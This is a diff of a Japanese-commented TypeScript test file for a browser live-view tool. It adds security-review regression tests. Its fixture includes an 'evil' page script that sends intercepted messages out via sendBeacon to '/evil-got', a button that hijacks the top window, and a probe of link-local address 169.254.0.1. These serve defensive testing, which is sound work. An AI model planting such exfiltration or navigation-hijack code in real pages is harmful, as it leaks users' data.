@@ -156,6 +156,14 @@ describe('stack-atlas live（実際のブラウザ）', () => {
     });
     const responses = events.filter((e) => e.t === 'response');
     expect(responses.map((r) => r.status)).toEqual(expect.arrayContaining([200, 201, 204]));
+    // 2026-11-12 追加（レビュー 1）: 返事は、いつも、その通信のあとに届く（時刻も、届いた順も）
+    for (const res of responses) {
+      const at = events.findIndex((e) => e === res);
+      const reqAt = events.findIndex((e) => e.t === 'request' && e.id === res.id);
+      expect(reqAt, res.id).toBeGreaterThanOrEqual(0);
+      expect(reqAt, res.id).toBeLessThan(at);
+      expect((events[reqAt] as { at: number }).at).toBeLessThanOrEqual(res.at);
+    }
     // 返事を差し替える仕組み（サンプルのアプリの Service Worker）が作った返事
     expect(responses.every((r) => r.inBrowser)).toBe(true);
     // 中身の無い返事（204）のあとに来る失敗は、失敗にしない
@@ -173,12 +181,13 @@ describe('stack-atlas live（実際のブラウザ）', () => {
     expect(lines.join('\n')).not.toContain(TEXT);
 
     // アプリの枠からの、にせの合図は効かない（値は出ず、状態も変わらない）
-    await live.frames()[1]!.evaluate(() => {
-      const ch = (window as unknown as { __stackAtlasLive: (s: unknown) => void }).__stackAtlasLive;
-      ch({ t: 'reveal', on: true });
-      ch({ t: 'hold', on: true });
+    // 2026-11-12 変更（レビュー 12）: 口の呼び出しが済むのを待ってから確かめる（前は、決まった時間だけ寝ていた）
+    await live.frames()[1]!.evaluate(async () => {
+      const ch = (window as unknown as { __stackAtlasLive: (s: unknown) => Promise<void> })
+        .__stackAtlasLive;
+      await ch({ t: 'reveal', on: true });
+      await ch({ t: 'hold', on: true });
     });
-    await new Promise((r) => setTimeout(r, 300));
     expect(session.status()).toMatchObject({ reveal: false, hold: false });
     expect((await delivered(live)).some((m) => m.t === 'values')).toBe(false);
 
@@ -299,12 +308,11 @@ document.getElementById('w').onclick = () => fetch('/write', { method: 'POST', h
     expect(app.got.filter((g) => g.startsWith('POST'))).toEqual([]);
     // 画面の合図でも外れない
     await session.livePage.evaluate(() =>
-      (window as unknown as { __stackAtlasLive: (s: unknown) => void }).__stackAtlasLive({
+      (window as unknown as { __stackAtlasLive: (s: unknown) => Promise<void> }).__stackAtlasLive({
         t: 'hold',
         on: false,
       }),
     );
-    await new Promise((r) => setTimeout(r, 200));
     expect(session.status()).toMatchObject({ hold: true, holdLocked: true });
   }, 60_000);
 
@@ -358,6 +366,189 @@ document.getElementById('w').onclick = () => fetch('/write', { method: 'POST', h
     expect(e).toMatchObject({ exitCode: 1 });
     expect(e.message).toContain('図に誤りがあるので、ライブを開きませんでした');
   });
+});
+
+// PR を作る前のコードレビューと、セキュリティのレビュー（10-2b）で見つかったことを、事実のまま固定する
+describe('stack-atlas live（レビューで見つかったこと）', () => {
+  /** 返事を差し替える仕組み（素通しするもの）・流しっぱなしの返事・隠れた文字・上の窓を移す、を持つ小さなアプリ */
+  async function reviewApp() {
+    const evil: string[] = [];
+    const page = `<!doctype html><meta charset="utf-8"><body>
+<div id="list"><p class="row">見える行<span hidden>隠れた文字 9q2</span></p></div>
+<button id="rm">rm</button><button id="pass">pass</button><button id="stream">stream</button>
+<button id="multi">multi</button><button id="top">top</button><p id="r"></p>
+<script>
+const ready = navigator.serviceWorker.register('/sw.js').then(() => navigator.serviceWorker.ready).then(() =>
+  navigator.serviceWorker.controller ? 0 : new Promise((r) => navigator.serviceWorker.addEventListener('controllerchange', r, { once: true })));
+const out = (t) => (document.getElementById('r').textContent = t);
+document.getElementById('rm').onclick = () => document.querySelector('.row').remove();
+document.getElementById('pass').onclick = async () => { await ready; const x = await fetch('/api/pass', { method: 'POST', body: 'p' }); out('pass ' + x.status); };
+document.getElementById('stream').onclick = async () => { const x = await fetch('/api/stream'); out('stream ' + x.status); };
+document.getElementById('multi').onclick = async () => { const f = new FormData(); f.append('field', 'マルチの欄の値 4kd8'); const x = await fetch('/api/multi', { method: 'POST', body: f }); out('multi ' + x.status); };
+document.getElementById('top').onclick = () => { top.location.href = location.origin + '/evil'; };
+</script>`;
+    const EVIL = `<!doctype html><meta charset="utf-8"><body><p>evil</p><script>
+window.__stackAtlasLiveReceive = (m) => { navigator.sendBeacon('/evil-got', JSON.stringify(m).slice(0, 200)); };
+</script>`;
+    const SW = `self.addEventListener('install', () => self.skipWaiting());
+self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));
+self.addEventListener('fetch', (e) => { if (new URL(e.request.url).pathname === '/api/pass') e.respondWith(fetch(e.request)); });`;
+    const app = await serve(undefined, (req, res, body) => {
+      const u = new URL(req.url ?? '/', 'http://x');
+      if (u.pathname === '/')
+        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' }).end(page);
+      else if (u.pathname === '/evil')
+        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' }).end(EVIL);
+      else if (u.pathname === '/evil-got') {
+        evil.push(body);
+        res.writeHead(204).end();
+      } else if (u.pathname === '/sw.js')
+        res.writeHead(200, { 'Content-Type': 'text/javascript' }).end(SW);
+      else if (u.pathname === '/api/stream') {
+        res.writeHead(200, { 'Content-Type': 'text/event-stream' });
+        res.write('data: 1\n\n'); // 終わらない
+      } else res.writeHead(200, { 'Content-Type': 'application/json' }).end('{"ok":true}');
+      return true;
+    });
+    servers.push(app.server);
+    return { app, evil };
+  }
+
+  it('素通しする差し替えは、「ブラウザの中で返事が作られた」にしない。流しっぱなしの返事も、返事の知らせが届く', async () => {
+    const { app } = await reviewApp();
+    const { session } = await open(app.url);
+    const frame = session.livePage.frameLocator('#app-pane iframe');
+    await frame.locator('#pass').click();
+    await frame.locator('#r', { hasText: 'pass 200' }).waitFor();
+    await frame.locator('#stream').click();
+    await frame.locator('#r', { hasText: 'stream 200' }).waitFor();
+    const events = await until(
+      () => eventsOf(session.livePage),
+      (es) => es.filter((e) => e.t === 'response').length >= 2,
+      5_000,
+    );
+    const responseFor = (path: string) => {
+      const req = events.find((e) => e.t === 'request' && e.path.includes(path));
+      return events.find((e) => e.t === 'response' && req && e.id === (req as { id: string }).id);
+    };
+    expect(responseFor('pass')).toMatchObject({ status: 200, inBrowser: false });
+    expect(app.got).toContain('POST /api/pass');
+    expect(responseFor('stream')).toMatchObject({ status: 200 });
+  }, 60_000);
+
+  it('ファイルを運ぶ形の中身は、「値を見る」でも渡さない', async () => {
+    const { app } = await reviewApp();
+    const { session } = await open(app.url);
+    const frame = session.livePage.frameLocator('#app-pane iframe');
+    await frame.locator('#multi').click();
+    await frame.locator('#r', { hasText: 'multi 200' }).waitFor();
+    await until(
+      () => eventsOf(session.livePage),
+      (es) => es.some((e) => e.t === 'response'),
+    );
+    await session.livePage.evaluate(() =>
+      (window as unknown as { __stackAtlasLive: (s: unknown) => Promise<void> }).__stackAtlasLive({
+        t: 'reveal',
+        on: true,
+      }),
+    );
+    const all = await until(
+      () => delivered(session.livePage),
+      (ms) => ms.some((m) => m.t === 'values'),
+    );
+    expect(JSON.stringify(all)).not.toContain('4kd8');
+  }, 60_000);
+
+  it('初めからあった要素を消したとき、隠れていた文字は拾わない', async () => {
+    const { app } = await reviewApp();
+    const { session } = await open(app.url);
+    const frame = session.livePage.frameLocator('#app-pane iframe');
+    await frame.locator('#rm').click();
+    const events = await until(
+      () => eventsOf(session.livePage),
+      (es) => es.some((e) => e.t === 'dom' && e.changes.some((c) => c.kind === 'removed')),
+    );
+    const removed = events
+      .flatMap((e) => (e.t === 'dom' ? e.changes : []))
+      .find((c) => c.kind === 'removed')!;
+    expect(removed.text).toContain('見える行');
+    expect(removed.text).not.toContain('9q2');
+  }, 60_000);
+
+  it('アプリが上の窓を移しても: 入れ替えは 1 回だけ、アプリの文書には何も渡らない、ライブの画面は 1 枚', async () => {
+    const { app, evil } = await reviewApp();
+    const { session, lines } = await open(app.url);
+    const frame = session.livePage.frameLocator('#app-pane iframe');
+    await frame.locator('#top').click();
+    await until(
+      async () => session.status().mode,
+      (m) => m === 'window',
+    );
+    const appPage = await until(
+      async () => session.appPage(),
+      (p) => p !== undefined && p.url().endsWith('/evil'),
+    );
+    await appPage!.evaluate(() => history.pushState({}, '', '/evil#2'));
+    await new Promise((r) => setTimeout(r, 1_000));
+    expect(lines.filter((l) => l.includes('いちばん上の窓を移した'))).toHaveLength(1);
+    expect(evil).toEqual([]);
+    expect(session.livePage.url()).toBe(session.liveUrl);
+    expect(
+      await session.livePage.evaluate(
+        () =>
+          typeof (window as unknown as { __stackAtlasLiveReceive?: unknown })
+            .__stackAtlasLiveReceive,
+      ),
+    ).toBe('function');
+  }, 60_000);
+
+  it('利用者がライブの画面を読み直すと、図と状態が渡し直され、アプリの枠が戻る', async () => {
+    const app = await serve(APP_DIR);
+    servers.push(app.server);
+    const { session } = await open(app.url);
+    await session.livePage.frameLocator('#app-pane iframe').locator('.card').first().waitFor();
+    await session.livePage.reload();
+    await session.livePage.frameLocator('#app-pane iframe').locator('.card').first().waitFor();
+    const ms = await delivered(session.livePage);
+    expect(ms.map((m) => m.t)).toEqual(expect.arrayContaining(['graph', 'status']));
+  }, 60_000);
+
+  it('リンクローカルの宛先（169.254.0.0/16）も、行き先の無い中継に回る', async () => {
+    const app = await serve(undefined, (req, res) => {
+      res
+        .writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' })
+        .end('<!doctype html><p id="x">app</p>');
+      return true;
+    });
+    servers.push(app.server);
+    const { session } = await open(app.url);
+    await session.livePage.frameLocator('#app-pane iframe').locator('#x').waitFor();
+    const frame = session.livePage.frames().find((f) => f.url().startsWith(app.url))!;
+    // 守りが外れていても、ふつうは何も無い宛先にする（ポート 9 などは、ブラウザが通信を出す前に止めるので、使わない）
+    await frame.evaluate(() =>
+      fetch('http://169.254.0.1/ll', { method: 'POST', body: 'x', mode: 'no-cors' }).catch(
+        () => {},
+      ),
+    );
+    const refused = await until(
+      async () => session.refused(),
+      (r) => r.hosts.includes('169.254.0.1'),
+      5_000,
+    );
+    expect(refused.hosts).toContain('169.254.0.1');
+  }, 60_000);
+
+  it.skipIf(process.platform === 'darwin')(
+    '127.0.0.1 ではないループバックのアドレス（127.0.0.2）で開いたアプリも、ライブの画面が開く',
+    async () => {
+      const app = await serve(APP_DIR, undefined, '127.0.0.2');
+      servers.push(app.server);
+      const { session } = await open(app.url);
+      expect(session.liveUrl).toMatch(/^http:\/\/127\.0\.0\.2:/);
+      await session.livePage.frameLocator('#app-pane iframe').locator('.card').first().waitFor();
+    },
+    60_000,
+  );
 });
 
 /** この機械の、ループバックではない IPv4 のアドレス（外の代わりの受け側を聞かせる。無ければ undefined） */
